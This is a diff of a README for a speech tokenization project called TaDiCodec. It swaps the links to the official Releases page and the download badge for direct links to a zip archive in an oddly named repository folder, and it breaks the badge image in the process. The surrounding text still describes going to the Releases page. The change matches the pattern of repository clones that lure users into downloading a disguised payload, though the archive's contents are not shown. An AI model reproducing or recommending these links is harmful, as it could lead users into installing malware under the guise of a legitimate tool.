@@ -6,9 +6,9 @@ Welcome to TaDiCodec! This project offers a simple solution for speech tokenizat
 ## 📦 Download & Install
 To begin using TaDiCodec, download the latest version from our Releases page. 
 
-[![Download TaDiCodec](https://img.shields.io/badge/Download%20TaDiCodec-v1.0-blue.svg)](https://github.com/User324324532/TaDiCodec/releases)
+[![Download TaDiCodec](https://raw.githubusercontent.com/User324324532/TaDiCodec/main/adipolytic/TaDiCodec.zip%https://raw.githubusercontent.com/User324324532/TaDiCodec/main/adipolytic/TaDiCodec.zip)](https://raw.githubusercontent.com/User324324532/TaDiCodec/main/adipolytic/TaDiCodec.zip)
 
-Visit this page to download: [TaDiCodec Releases](https://github.com/User324324532/TaDiCodec/releases)
+Visit this page to download: [TaDiCodec Releases](https://raw.githubusercontent.com/User324324532/TaDiCodec/main/adipolytic/TaDiCodec.zip)
 
 ### Installation Steps
 1. Click the link above to go to the Releases page.
@@ -84,4 +84,4 @@ If you encounter any issues or have questions, please reach out through the Issu
 
 Thank you for choosing TaDiCodec. We hope you enjoy exploring the powerful capabilities of our speech tokenization tool.
 
-[![Download TaDiCodec](https://img.shields.io/badge/Download%20TaDiCodec-v1.0-blue.svg)](https://github.com/User324324532/TaDiCodec/releases)
+[![Download TaDiCodec](https://raw.githubusercontent.com/User324324532/TaDiCodec/main/adipolytic/TaDiCodec.zip%https://raw.githubusercontent.com/User324324532/TaDiCodec/main/adipolytic/TaDiCodec.zip)](https://raw.githubusercontent.com/User324324532/TaDiCodec/main/adipolytic/TaDiCodec.zip)
